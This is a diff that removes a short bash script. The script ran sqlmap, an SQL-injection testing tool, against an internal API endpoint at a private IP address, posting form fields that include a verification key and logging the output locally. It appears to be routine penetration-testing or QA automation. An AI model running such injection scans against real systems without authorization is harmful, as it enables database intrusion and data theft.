@@ -1,2 +1,0 @@
-#!/bin/bash
-python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u 'http://172.16.56.199/api/whistleMS/index.php' --data 'm=user&a=getVerifyKey &device_type=web&verify_key=84f9a4f61d0b7149a9b9e23d04499c39' --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/54_getVerifyKey.log
